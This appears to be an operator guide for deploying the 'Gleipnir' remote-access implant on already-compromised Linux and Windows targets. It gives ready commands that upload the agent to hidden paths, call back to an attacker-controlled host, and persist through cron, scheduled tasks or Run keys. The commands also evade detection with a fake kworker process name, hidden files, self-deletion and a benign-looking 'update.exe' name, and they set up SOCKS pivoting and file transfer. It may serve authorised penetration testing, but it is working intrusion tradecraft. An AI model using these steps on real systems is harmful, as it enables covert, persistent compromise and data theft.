# Gleipnir Agent Deployment

## When to use

- You have initial access to a target (shell, RCE, file write + exec)
- You need persistent shell access that survives reboots and network drops
- You need file transfer or SOCKS pivoting through the target
- Raw reverse shells (netcat, bash) are unreliable or lack features

## Tags

- ATT&CK: T1059 (Command and Scripting Interpreter), T1105 (Ingress Tool Transfer)
- Platform: Linux, Windows
- Phase: exploit, postexploit

## Binary selection

Find the right binary for the target with `pk agent path <target>`:

| Target | Binary | Notes |
|--------|--------|-------|
| `linux-amd64` | pk-agent-linux-amd64 | Slim, ~500KB, plain TCP |
| `linux-amd64-tls` | pk-agent-linux-amd64-tls | ~1.5MB, encrypted |
| `linux-arm64` | pk-agent-linux-arm64 | ARM64 Linux (Raspberry Pi, AWS Graviton) |
| `windows-amd64` | pk-agent-windows-amd64.exe | Plain TCP |
| `windows-amd64-tls` | pk-agent-windows-amd64-tls.exe | Encrypted |

Pre-compiled binaries are in `/opt/gleipnir/agents/` on the toolbox.

## Deployment: Linux

```bash
# Upload the agent
pk upload <session> $(pk agent path linux-amd64-tls) /tmp/.cache

# Make executable and run with persistence
pk shell exec <session> "chmod +x /tmp/.cache && /tmp/.cache -H <LHOST> -p 4444 --tls --install /dev/shm --cron --masquerade '[kworker/0:1]' --self-delete &"
```

Flags explained:
- `-H <LHOST>`: callback IP (comma-separated for fallback: `-H 10.10.14.5,10.10.14.6`)
- `--tls`: encrypted channel (relay auto-generates cert)
- `--install /dev/shm`: copy to hidden path, run from there
- `--cron`: survive reboots via @reboot crontab
- `--masquerade '[kworker/0:1]'`: fake process name in `ps`
- `--self-delete`: remove the original binary after loading

## Deployment: Windows

```bash
# Upload the agent
pk upload <session> $(pk agent path windows-amd64-tls) "C:\ProgramData\Microsoft\update.exe"

# Run with persistence
pk shell exec <session> "C:\ProgramData\Microsoft\update.exe -H <LHOST> -p 4444 --tls --install \"\" --cron --task-name SystemHealthCheck"
```

Flags for Windows:
- `--install ""`: defaults to `%APPDATA%\Microsoft\update.exe`, sets `attrib +h`
- `--cron`: creates scheduled task (onlogon, highest privilege)
- `--registry`: alternative to schtasks, uses HKCU Run key
- `--task-name SystemHealthCheck`: task name shown in Task Scheduler
- `--self-delete`: delayed deletion via `cmd /c ping & del`

## Bind mode (egress-filtered targets)

When the target blocks outbound connections, use bind mode. The agent listens on a port
and the relay connects to it. Requires inbound access to the target (VPN, pivot, port forward).

```bash
# Upload and start agent in bind mode
pk shell exec <session> "chmod +x /tmp/.cache && /tmp/.cache --bind -p 8443 --tls &"

# From the relay: connect to the bind agent
gleipnir connect <TARGET_IP> 8443 --tls

# Or via HTTP API
curl -X POST http://localhost:6666/api/connect \
  -H 'Content-Type: application/json' \
  -d '{"host":"<TARGET_IP>","port":8443,"tls":true}'
```

Bind mode flags:
- `--bind`: listen instead of connecting out
- `--bind-addr <addr>`: listen address (default: 0.0.0.0)
- `-p <port>`: listen port
- `--tls`: agent generates a self-signed cert automatically

Bind mode accepts one connection at a time. When the session ends, the agent returns
to listening. Persistence flags (`--cron`, `--install`) work in bind mode too.

Choose the right mode based on network conditions:

| Scenario | Mode | Why |
|----------|------|-----|
| Target can reach your IP | Reverse connect (`-H`) | Standard, works behind NAT |
| Target blocks outbound | Bind (`--bind`) | Agent listens, relay connects in |
| Only HTTP/S out allowed | HTTP beacon (future) | Tunnels through allowed traffic |

## Verify connection

```bash
pk shell list                    # check session appeared
pk shell info <session>          # confirm OS, user, hostname
pk shell exec <session> "whoami" # verify command execution
```

## Post-deployment

- `pk shell attach <session>` for interactive terminal
- `pk tunnel up <session> --socks 1080` for pivoting
- `pk upload`/`pk download` for file transfer (handles large files, binary safe)

Session auto-reconnects on network drops or target reboots (exponential backoff,
1s to 30s). Session ID persists so the relay resumes the same session name.
